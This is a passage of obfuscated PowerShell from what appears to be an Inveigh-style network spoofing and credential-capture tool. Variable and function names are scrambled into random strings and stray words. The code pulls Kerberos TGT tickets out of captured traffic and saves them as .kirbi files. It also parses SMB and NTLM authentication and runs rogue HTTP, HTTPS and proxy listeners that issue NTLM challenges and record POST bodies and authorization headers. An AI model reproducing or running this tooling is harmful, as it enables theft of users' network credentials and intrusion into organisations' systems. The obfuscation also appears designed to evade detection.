                    $ASN1 = rawhide $data[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 5)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + 10)]
                    $XfmLEGQp99 += $ASN1[0]
                    $ippLnOph99 = $ASN1[1]
                    [Byte[]]$FUCAPxQy99 = $data[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 5)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + $ippLnOph99 + 4)]
                    [Byte[]]$DvPxUzVp99 = Jockey $NcyTFCBp99 $FUCAPxQy99[0..($FUCAPxQy99.Count - 13)]
                    [Byte[]]$NcyTFCBp99 = uncivilized encrypt 14 $xjrnXmHa99
                    $DvPxUzVp99 = $DvPxUzVp99[16..$DvPxUzVp99.Count]
                    [Byte[]]$hHojoQYY99 = statelier $DvPxUzVp99
                    $ASN1 = rawhide $DvPxUzVp99[4..9]
                    $XfmLEGQp99 = $ASN1[0]
                    $ASN1 = rawhide $DvPxUzVp99[($XfmLEGQp99 + 4)..($XfmLEGQp99 + 9)]
                    $XfmLEGQp99 += $ASN1[0]
                    $AqtJsuyo99 = $DvPxUzVp99[($XfmLEGQp99 + 7)]
                    $realm = candies 0 $AqtJsuyo99 $DvPxUzVp99[($XfmLEGQp99 + 8)..($XfmLEGQp99 + $AqtJsuyo99 + 7)]
                    $lotubXLF99 = $DvPxUzVp99[($XfmLEGQp99 + $AqtJsuyo99 + 22)]
                    $NtaSIdse99 = candies 0 $lotubXLF99 $DvPxUzVp99[($XfmLEGQp99 + $AqtJsuyo99 + 23)..($XfmLEGQp99 + $AqtJsuyo99 + $lotubXLF99 + 22)]
                    $qHBiOlsp99 = [System.BitConverter]::ToString($DvPxUzVp99)
                    $qHBiOlsp99 = $qHBiOlsp99 -replace "-",""
                    $dMPSfQFN99 = $qHBiOlsp99.IndexOf("A003020112A2")
                    if($dMPSfQFN99 -ge 0)
                    {
                        $ASN1 = rawhide $DvPxUzVp99[($dMPSfQFN99 / 2 + 5)..($dMPSfQFN99 / 2 + 10)]
                        $XfmLEGQp99 = $ASN1[0]
                        $ASN1 = rawhide $DvPxUzVp99[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 5)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + 10)]
                        $XfmLEGQp99 += $ASN1[0]
                        $ippLnOph99 = $ASN1[1]
                        [Byte[]]$FUCAPxQy99 = $DvPxUzVp99[($dMPSfQFN99 / 2 + $XfmLEGQp99 + 5)..($dMPSfQFN99 / 2 + $XfmLEGQp99 + $ippLnOph99 + 4)]
                        [Byte[]]$DvPxUzVp99 = Jockey $NcyTFCBp99 $FUCAPxQy99[0..($FUCAPxQy99.Count - 13)]
                        $DvPxUzVp99 = $DvPxUzVp99[16..$DvPxUzVp99.Count]
                        [Byte[]]$iSKlFFLm99 = defies $DvPxUzVp99
                        [Byte[]]$kirbi = sensitivities $hHojoQYY99 $iSKlFFLm99
                        if($NtaSIdse99 -notmatch '[^\x00-\x7F]+' -and $realm -notmatch '[^\x00-\x7F]+')
                        {
                            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos TGT captured for $NtaSIdse99@$realm from $lnnWyXyw99") > $null   
                            $wzCNZfgp99.kerberos_TGT_list.Add($kirbi) > $null
                            $wzCNZfgp99.kerberos_TGT_username_list.Add("$vngeYplM99 $NtaSIdse99 $realm $($wzCNZfgp99.kerberos_TGT_list.Count - 1)") > $null
                            $wtYwJBoy99 = ($wzCNZfgp99.kerberos_TGT_username_list -like "* $NtaSIdse99 $realm *").Count
                        }
                        if($wtYwJBoy99 -le $NkBYNNgQ99)
                        {
                            try
                            {
                                $RkdJHAYO99 = $HHgEZHCn99 + "\$NtaSIdse99@$realm-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
                                $EGkWxMrq99 = New-Object System.IO.FileStream $RkdJHAYO99,'Append','Write','Read'
                                $EGkWxMrq99.Write($kirbi,0,$kirbi.Count)
                                $EGkWxMrq99.close()
                                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos TGT for $NtaSIdse99@$realm written to $RkdJHAYO99") > $null
                            }
                            catch
                            {
                                $kRjlpgSh99 = $_.Exception.Message
                                $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                            }
                        }
                    }
                    else
                    {
                        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos TGT not found from $lnnWyXyw99") > $null    
                    }
                }
                else
                {
                    $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos autenticator not found from $HzYTuylQ99") > $null    
                }
            }
            else
            {
                $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos failed to decrypt capture from $lnnWyXyw99") > $null    
            }
        }
        else
        {
            
            if($NPTdRYuo99 -like "*A0030201??A1030201*")
            {
                if($NPTdRYuo99 -like "*A003020111A1030201*")
                {
                    $NuxWpAZQ99 = "AES128-CTS-HMAC-SHA1-96"
                }
                elseif($NPTdRYuo99 -like "*A003020117A1030201*")
                {
                    $NuxWpAZQ99 = "RC4-HMAC"
                }
                elseif($NPTdRYuo99 -like "*A003020118A1030201*")
                {
                    $NuxWpAZQ99 = "RC4-HMAC-EXP"
                }
                elseif($NPTdRYuo99 -like "*A003020103A1030201*")
                {
                    $NuxWpAZQ99 = "DES-CBC-MD5"
                }
                elseif($NPTdRYuo99 -like "*A003020101A1030201*")
                {
                    $NuxWpAZQ99 = "DES-CBC-CRC"
                }
                $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos unsupported encryption type $NuxWpAZQ99 from $lnnWyXyw99") > $null
            }
            else
            {
                $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $CavJYakf99($PFOuglCK99) Kerberos failed to extract AS-REQ from $lnnWyXyw99") > $null 
            }
               
        }
    }
}
$WQUQIDSa99 =
{
    
    function excise
    {
        param ([Byte[]]$aqeEUOdc99,[String]$vhBRSHQV99,[String]$ysNJdeDt99,[String]$QgujXlXi99,[String]$dAOLFIPT99,[String]$gprkaOZp99)
        $CzPqmPOx99 = [System.BitConverter]::ToString($aqeEUOdc99)
        $CzPqmPOx99 = $CzPqmPOx99 -replace "-",""
        $lnnWyXyw99 = "$ysNJdeDt99`:$dAOLFIPT99"
        $YgvOwjTl99 = "$QgujXlXi99`:$gprkaOZp99"
        $mICeycMC99 = $CzPqmPOx99.IndexOf("FF534D42")
        if(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0 -and $CzPqmPOx99.SubString(($mICeycMC99 + 8),2) -eq "72" -and $ysNJdeDt99 -ne $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($gprkaOZp99) negotiation request detected from $lnnWyXyw99") > $null
        }
        elseif(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0 -and $CzPqmPOx99.SubString(($mICeycMC99 + 8),2) -eq "72" -and $ysNJdeDt99 -eq $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($dAOLFIPT99) outgoing negotiation request detected to $YgvOwjTl99") > $null
        }
        if(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0)
        {
            $wzCNZfgp99.SMB_session_table.Add($lnnWyXyw99,"")
        }
        $mICeycMC99 = $CzPqmPOx99.IndexOf("FE534D42")
        if(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0 -and $CzPqmPOx99.SubString(($mICeycMC99 + 24),4) -eq "0000" -and $ysNJdeDt99 -ne $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($gprkaOZp99) negotiation request detected from $lnnWyXyw99") > $null
        }
        elseif(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0 -and $CzPqmPOx99.SubString(($mICeycMC99 + 24),4) -eq "0000" -and $ysNJdeDt99 -eq $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($dAOLFIPT99) outgoing negotiation request detected to $YgvOwjTl99") > $null
        }
        if(!$wzCNZfgp99.SMB_session_table.ContainsKey($lnnWyXyw99) -and $mICeycMC99 -gt 0)
        {
            $wzCNZfgp99.SMB_session_table.Add($lnnWyXyw99,"")
        }
        $mICeycMC99 = $CzPqmPOx99.IndexOf("2A864886F7120102020100")
        if($mICeycMC99 -gt 0 -and $ysNJdeDt99 -ne $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($gprkaOZp99) authentication method is Kerberos for $lnnWyXyw99") > $null
            if($YQiNABub99 -eq 'Y')
            {
                $zKdTdMRc99 = articulations 0 $aqeEUOdc99[82..83]
                $zKdTdMRc99 -= $mICeycMC99 / 2
                $rgaFuzdx99 = $aqeEUOdc99[($mICeycMC99/2)..($mICeycMC99/2 + $aqeEUOdc99.Count)]
            }
        }
        elseif($mICeycMC99 -gt 0 -and $ysNJdeDt99 -eq $vhBRSHQV99)
        {
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($dAOLFIPT99) outgoing authentication method is Kerberos to $YgvOwjTl99") > $null
            if($YQiNABub99 -eq 'Y')
            {
                $zKdTdMRc99 = articulations 0 $aqeEUOdc99[82..83]
                $zKdTdMRc99 -= $mICeycMC99 / 2
                $rgaFuzdx99 = $aqeEUOdc99[($mICeycMC99/2)..($mICeycMC99/2 + $aqeEUOdc99.Count)]
            }
        }
        return $zKdTdMRc99,$rgaFuzdx99
    }
    function deadlocking
    {
        param ([Byte[]]$aqeEUOdc99)
        $CzPqmPOx99 = [System.BitConverter]::ToString($aqeEUOdc99)
        $CzPqmPOx99 = $CzPqmPOx99 -replace "-",""
        $RedhTYCN99 = $CzPqmPOx99.IndexOf("4E544C4D53535000")
        if($RedhTYCN99 -gt 0)
        {
            if($CzPqmPOx99.SubString(($RedhTYCN99 + 16),8) -eq "02000000")
            {
                $pyGKsWFU99 = $CzPqmPOx99.SubString(($RedhTYCN99 + 48),16)
            }
            $jYOZtNdP99 = articulations (($RedhTYCN99 + 24) / 2) $aqeEUOdc99
            $tbtjhptD99 = [System.Convert]::ToInt16(($CzPqmPOx99.SubString(($RedhTYCN99 + 44),2)),16)
            $tbtjhptD99 = [Convert]::ToString($tbtjhptD99,2)
            $QUaVBuIh99 = $tbtjhptD99.SubString(0,1)
            if($QUaVBuIh99 -eq 1)
            {
                $HbbXDMBL99 = ($RedhTYCN99 + 80) / 2
                $HbbXDMBL99 = $HbbXDMBL99 + $jYOZtNdP99 + 16
                $CpoaFgtq99 = $aqeEUOdc99[$HbbXDMBL99]
                $i = 0
                while($CpoaFgtq99 -ne 0 -and $i -lt 10)
                {
                    $KNqwYHvR99 = articulations ($HbbXDMBL99 + 2) $aqeEUOdc99
                    switch($CpoaFgtq99) 
                    {
                        2
                        {
                            $MunDsNmm99 = candies ($HbbXDMBL99 + 4) $KNqwYHvR99 $aqeEUOdc99
                        }
                        3
                        {
                            $QLbEzgbU99 = candies ($HbbXDMBL99 + 4) $KNqwYHvR99 $aqeEUOdc99
                        }
                        4
                        {
                            $nEgfHQcG99 = candies ($HbbXDMBL99 + 4) $KNqwYHvR99 $aqeEUOdc99
                        }
                    }
                    $HbbXDMBL99 = $HbbXDMBL99 + $KNqwYHvR99 + 4
                    $CpoaFgtq99 = $aqeEUOdc99[$HbbXDMBL99]
                    $i++
                }
                if($MunDsNmm99 -and $nEgfHQcG99 -and !$wzCNZfgp99.domain_mapping_table.$MunDsNmm99 -and $MunDsNmm99 -ne $nEgfHQcG99)
                {
                    $wzCNZfgp99.domain_mapping_table.Add($MunDsNmm99,$nEgfHQcG99)
                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $MunDsNmm99 to $nEgfHQcG99") > $null
                }
                for($i = 0;$i -lt $wzCNZfgp99.enumerate.Count;$i++)
                {
                    if($wzCNZfgp99.enumerate[$i].IP -eq $YzPoRbVp99 -and !$wzCNZfgp99.enumerate[$i].Hostname)
                    {
                        $wzCNZfgp99.enumerate[$i].Hostname = $QLbEzgbU99
                        $wzCNZfgp99.enumerate[$i]."DNS Domain" = $nEgfHQcG99
                        $wzCNZfgp99.enumerate[$i]."netBIOS Domain" = $MunDsNmm99
                        break
                    }
                }
            }
        }
        return $pyGKsWFU99
    }
}
$piiENYJq99 =
{
    param ($OpSametq99,$YQiNABub99,$NkBYNNgQ99,$mPKrHuBF99,$rHCPryid99,$kvoRCffi99,$mQkdAcSO99,
    $ronDUKWy99,$nKkxBvGh99,$UbhtORQL99,$uuWWIRDe99,$DYCiYqcl99,$OHQVRNnZ99,$uzYCVpkd99,$SvQlrCWB99,
    $qilonUmG99,$IP,$FLmqCpEm99,$HHgEZHCn99,$Proxy,$xZwnRmnl99,$LIbSoyXf99,$cWbsxIoQ99,
    $GvqEXUZu99,$mooPFzLL99)
    function nippier
    {
        param ([String]$OpSametq99,[Bool]$YVqSuQJW99,[String]$dOnyUfpW99,[Int]$utaJvaDQ99)
        $SUMzjKyK99 = Get-Date
        $SUMzjKyK99 = $SUMzjKyK99.ToFileTime()
        $SUMzjKyK99 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($SUMzjKyK99))
        $SUMzjKyK99 = $SUMzjKyK99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        if($OpSametq99)
        {
            $CkQteQxa99 = $OpSametq99
            $IpzEjmKr99 = $CkQteQxa99.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $IpzEjmKr99 = $IpzEjmKr99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $IpzEjmKr99 = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -fkkZmGkZ99 1 -iRDzftBy99 255)})
            $CkQteQxa99 = $IpzEjmKr99 -replace ' ', ''
            $IpzEjmKr99 = $IpzEjmKr99.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        if($YVqSuQJW99)
        {
            $fSHTqpgc99 = 0x05,0x82,0x89,0x0a
        }
        else
        {
            $fSHTqpgc99 = 0x05,0x82,0x81,0x0a
        }
        if(!$wzCNZfgp99.HTTP_session_table.ContainsKey("$dOnyUfpW99`:$utaJvaDQ99"))
        {
            $wzCNZfgp99.HTTP_session_table.Add("$dOnyUfpW99`:$utaJvaDQ99",$CkQteQxa99)
        }
        else
        {
            $wzCNZfgp99.HTTP_session_table["$dOnyUfpW99`:$utaJvaDQ99"] = $CkQteQxa99
        }
        $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) NTLM challenge $CkQteQxa99 sent to $keypOdIH99`:$ITbNpVlc99") > $null
        $pcDaFXpx99 = [System.Text.Encoding]::Unicode.GetBytes($wzCNZfgp99.computer_name)
        $TveUdKPX99 = [System.Text.Encoding]::Unicode.GetBytes($wzCNZfgp99.netBIOS_domain)
        $nybxCPZM99 = [System.Text.Encoding]::Unicode.GetBytes($wzCNZfgp99.DNS_domain)
        $DqOCAVmD99 = [System.Text.Encoding]::Unicode.GetBytes($wzCNZfgp99.DNS_computer_name)
        $akWpwQLF99 = [System.BitConverter]::GetBytes($pcDaFXpx99.Length)[0,1]
        $oeEWDAfb99 = [System.BitConverter]::GetBytes($TveUdKPX99.Length)[0,1]
        $mmsaoWsz99 = [System.BitConverter]::GetBytes($nybxCPZM99.Length)[0,1]
        $yKKkACsf99 = [System.BitConverter]::GetBytes($DqOCAVmD99.Length)[0,1]
        $HeiNfRTH99 = [System.BitConverter]::GetBytes($pcDaFXpx99.Length + $TveUdKPX99.Length + $nybxCPZM99.Length + $nybxCPZM99.Length + $DqOCAVmD99.Length + 36)[0,1]
        $RlnWDzsd99 = [System.BitConverter]::GetBytes($TveUdKPX99.Length + 56)
        $VncldiAY99 = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            $oeEWDAfb99 +
                            $oeEWDAfb99 +
                            0x38,0x00,0x00,0x00 +
                            $fSHTqpgc99 +
                            $IpzEjmKr99 +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $HeiNfRTH99 +
                            $HeiNfRTH99 + 
                            $RlnWDzsd99 +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            $TveUdKPX99 +
                            0x02,0x00 +
                            $oeEWDAfb99 +
                            $TveUdKPX99 +
                            0x01,0x00 +
                            $akWpwQLF99 +
                            $pcDaFXpx99 +
                            0x04,0x00 +
                            $mmsaoWsz99 +
                            $nybxCPZM99 +
                            0x03,0x00 +
                            $yKKkACsf99 +
                            $DqOCAVmD99 +
                            0x05,0x00 +
                            $mmsaoWsz99 +
                            $nybxCPZM99 +
                            0x07,0x00,0x08,0x00 +
                            $SUMzjKyK99 +
                            0x00,0x00,0x00,0x00,0x0a,0x0a
        $tUyPUseC99 = [System.Convert]::ToBase64String($VncldiAY99)
        $NTLM = "NTLM " + $tUyPUseC99
        
        return $NTLM
    }
    if($qilonUmG99)
    {
        $vgfsCcxE99 = "HTTPS"
    }
    elseif($LIbSoyXf99)
    {
        $vgfsCcxE99 = "Proxy"
    }
    else
    {
        $vgfsCcxE99 = "HTTP"
    }
    if($UbhtORQL99 -ne '0.0.0.0')
    {
        $UbhtORQL99 = [System.Net.IPAddress]::Parse($UbhtORQL99)
        $mMjgxcOq99 = New-Object System.Net.IPEndPoint($UbhtORQL99,$uuWWIRDe99)
    }
    else
    {
        $mMjgxcOq99 = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,$uuWWIRDe99)
    }
    $quUrHtFY99 = $true
    $ccxdllPM99 = New-Object System.Net.Sockets.TcpListener $mMjgxcOq99
   
    if($LIbSoyXf99)
    {
        $pcnOgQSa99 = New-Object System.Net.Sockets.LingerOption($true,0)
        $ccxdllPM99.Server.LingerState = $pcnOgQSa99
    }
    
    try
    {
        $ccxdllPM99.Start()
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $vgfsCcxE99 listener") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $quUrHtFY99 = $false
    }
    if($YQiNABub99 -eq 'Y')
    {
        if($rHCPryid99)
        {
            $EbBOudFK99 = (&{for ($i = 0;$i -lt $rHCPryid99.Length;$i += 2){$rHCPryid99.SubString($i,2)}}) -join "-"
            $EbBOudFK99 = $EbBOudFK99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($mPKrHuBF99)
        {
            $EbBOudFK99 = itemization ($mPKrHuBF99.UserName).Trim("\") $mPKrHuBF99.Password
        }
    }
    
    :HTTP_listener_loop while($wzCNZfgp99.running -and $quUrHtFY99)
    {
        $FDxPnkDS99 = $null
        $uyogEpDJ99 = New-Object System.Byte[] 8192
        $CsiCXeez99 = $true
        $qTSaxVDF99 = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: text/html")
        $epBYCgxh99 = $null
        $MggddCTr99 = $null
        $CtKzWvDn99 = $null
        $qNxbZRoh99 = ''
        $fukYiaDq99 = ''
        $umyMlKuv99 = $null
        $iPQQkagw99 = $null
        $xiYsInvL99 = $null
        $NTLM = "NTLM"
        if(!$GmJLCyzY99.Connected -and $wzCNZfgp99.running)
        {
            $hiQfnsaO99 = $false
            $QaUJjFht99 = $ccxdllPM99.BeginAcceptTcpClient($null,$null)
            do
            {
                if(!$wzCNZfgp99.running)
                {
                    break HTTP_listener_loop
                }
                
                Start-Sleep -m 10
            }
            until($QaUJjFht99.IsCompleted)
            $GmJLCyzY99 = $ccxdllPM99.EndAcceptTcpClient($QaUJjFht99)
            $EKIDRUjb99 = $GmJLCyzY99.Client.Handle
            
            if($qilonUmG99)
            {
                $dzhwqqCB99 = $GmJLCyzY99.GetStream()
                $NjHSxTIK99 = New-Object System.Net.Security.SslStream($dzhwqqCB99,$false)
                $SAsBeJiV99 = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $wzCNZfgp99.certificate_CN})
                $NjHSxTIK99.AuthenticateAsServer($SAsBeJiV99,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                $NjHSxTIK99 = $GmJLCyzY99.GetStream()
            }
            
        }
        if($qilonUmG99)
        {
            [Byte[]]$sofCUeRK99 = $null
            while($dzhwqqCB99.DataAvailable)
            {
                $BkgODQOf99 = $NjHSxTIK99.Read($uyogEpDJ99,0,$uyogEpDJ99.Length)
                $sofCUeRK99 += $uyogEpDJ99[0..($BkgODQOf99 - 1)]
            }
            $FDxPnkDS99 = [System.BitConverter]::ToString($sofCUeRK99)
        }
        else
        {
            while($NjHSxTIK99.DataAvailable)
            {
                $NjHSxTIK99.Read($uyogEpDJ99,0,$uyogEpDJ99.Length) > $null
            }
            $FDxPnkDS99 = [System.BitConverter]::ToString($uyogEpDJ99)
        }
        
        if($FDxPnkDS99 -like "47-45-54-20*" -or $FDxPnkDS99 -like "48-45-41-44-20*" -or $FDxPnkDS99 -like "4f-50-54-49-4f-4e-53-20*" -or $FDxPnkDS99 -like "43-4f-4e-4e-45-43-54*" -or $FDxPnkDS99 -like "50-4f-53-54*")
        {
            $EySvlcZx99 = $FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-20-") + 4,$FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $EySvlcZx99 = $EySvlcZx99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $xiYsInvL99 = New-Object System.String ($EySvlcZx99,0,$EySvlcZx99.Length)
            $keypOdIH99 = $GmJLCyzY99.Client.RemoteEndpoint.Address.IPAddressToString
            $ITbNpVlc99 = $GmJLCyzY99.Client.RemoteEndpoint.Port
            $LdHFmgtZ99 = $true
            if(($FDxPnkDS99).StartsWith("47-45-54-20"))
            {
                $aXVETwus99 = "GET"
            }
            elseif(($FDxPnkDS99).StartsWith("48-45-41-44-20"))
            {
                $aXVETwus99 = "HEAD"
            }
            elseif(($FDxPnkDS99).StartsWith("4f-50-54-49-4F-4E-53-20"))
            {
                $aXVETwus99 = "OPTIONS"
            }
            elseif(($FDxPnkDS99).StartsWith("43-4F-4E-4E-45-43-54"))
            {
                $aXVETwus99 = "CONNECT"
            }
            elseif(($FDxPnkDS99).StartsWith("50-4F-53-54-20"))
            {
                $aXVETwus99 = "POST"
            }
            
            if($FLmqCpEm99)
            {
                $wzCNZfgp99.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $wzCNZfgp99.hostname_spoof = $true
            }
            if($FDxPnkDS99 -like "*-48-6F-73-74-3A-20-*")
            {
                $NiCYLzsh99 = $FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $NiCYLzsh99 = $NiCYLzsh99.Substring(0,$NiCYLzsh99.IndexOf("-0D-0A-"))
                $NiCYLzsh99 = $NiCYLzsh99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $umyMlKuv99 = New-Object System.String ($NiCYLzsh99,0,$NiCYLzsh99.Length)
            }
            if($FDxPnkDS99 -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $wfgbhdzC99 = $FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $wfgbhdzC99 = $wfgbhdzC99.Substring(0,$wfgbhdzC99.IndexOf("-0D-0A-"))
                $wfgbhdzC99 = $wfgbhdzC99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $iPQQkagw99 = New-Object System.String ($wfgbhdzC99,0,$wfgbhdzC99.Length)
            }
            if($fdkCHuYK99 -ne $xiYsInvL99 -or $EKIDRUjb99 -ne $GmJLCyzY99.Client.Handle)
            {
                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) $aXVETwus99 request for $xiYsInvL99 received from $keypOdIH99`:$ITbNpVlc99") > $null
                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) host header $umyMlKuv99 received from $keypOdIH99`:$ITbNpVlc99") > $null
                if($iPQQkagw99)
                {
                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) user agent received from $keypOdIH99`:$ITbNpVlc99`:`n$iPQQkagw99") > $null
                }
                if($Proxy -eq 'Y' -and $xZwnRmnl99.Count -gt 0 -and ($xZwnRmnl99 | Where-Object {$iPQQkagw99 -match $_}))
                {
                    $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) ignoring wpad.dat request due to user agent match from $keypOdIH99`:$ITbNpVlc99") > $null
                }
            }
            if($FDxPnkDS99 -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $aPzQAPRs99 = $FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $aPzQAPRs99 = $aPzQAPRs99.Substring(0,$aPzQAPRs99.IndexOf("-0D-0A-"))
                $aPzQAPRs99 = $aPzQAPRs99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $fukYiaDq99 = New-Object System.String ($aPzQAPRs99,0,$aPzQAPRs99.Length)
            }
            if(($xiYsInvL99 -notmatch '/wpad.dat' -and $mQkdAcSO99 -eq 'Anonymous') -or ($xiYsInvL99 -match '/wpad.dat' -and $cWbsxIoQ99 -eq 'Anonymous') -or (
            $xiYsInvL99 -match '/wpad.dat' -and $cWbsxIoQ99 -like 'NTLM*' -and $GvqEXUZu99.Count -gt 0 -and ($GvqEXUZu99 | Where-Object {$iPQQkagw99 -match $_})))
            {
                $TVMOxybY99 = 0x32,0x30,0x30
                $ZhpswcZT99 = 0x4f,0x4b
                $hiQfnsaO99 = $true
            }
            else
            {
                if(($xiYsInvL99 -match '/wpad.dat' -and $cWbsxIoQ99 -eq 'NTLM') -or ($xiYsInvL99 -notmatch '/wpad.dat' -and $mQkdAcSO99 -eq 'NTLM'))
                {
                    $lYjjdZKb99 = $true
                }
                else
                {
                    $lYjjdZKb99 = $false
                }
                if($LIbSoyXf99)
                {
                    $TVMOxybY99 = 0x34,0x30,0x37
                    $MggddCTr99 = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $TVMOxybY99 = 0x34,0x30,0x31
                    $MggddCTr99 = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                $ZhpswcZT99 = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
            
            if($FDxPnkDS99 -like "50-4f-53-54*")
            {
                $RkDKoasy99 = $FDxPnkDS99.Substring($FDxPnkDS99.IndexOf("-0D-0A-0D-0A-") + 12)
                $RkDKoasy99 = $RkDKoasy99.Substring(0,$RkDKoasy99.IndexOf("-00-"))
                $RkDKoasy99 = $RkDKoasy99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $OFqCbNCY99 = New-Object System.String ($RkDKoasy99,0,$RkDKoasy99.Length)
                if($uaJKRuTY99 -ne $OFqCbNCY99)
                {
                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) POST request $OFqCbNCY99 captured from $keypOdIH99`:$ITbNpVlc99") > $null
                    $wzCNZfgp99.POST_request_file_queue.Add($OFqCbNCY99) > $null
                    $wzCNZfgp99.POST_request_list.Add($OFqCbNCY99) > $null
                }
                $uaJKRuTY99 = $OFqCbNCY99
            }
            
            if($fukYiaDq99.StartsWith('NTLM '))
            {
                $fukYiaDq99 = $fukYiaDq99 -replace 'NTLM ',''
                [Byte[]]$qKIypXbm99 = [System.Convert]::FromBase64String($fukYiaDq99)
                $LdHFmgtZ99 = $false
                if([System.BitConverter]::ToString($qKIypXbm99[8..11]) -eq '01-00-00-00')
                {
                    $NTLM = nippier $OpSametq99 $lYjjdZKb99 $keypOdIH99 $GmJLCyzY99.Client.RemoteEndpoint.Port
                }
                elseif([System.BitConverter]::ToString($qKIypXbm99[8..11]) -eq '03-00-00-00')
                {
                    chrysalises $qKIypXbm99 "Y" $keypOdIH99 $ITbNpVlc99 $uuWWIRDe99 $vgfsCcxE99
                    $TVMOxybY99 = 0x32,0x30,0x30
                    $ZhpswcZT99 = 0x4f,0x4b
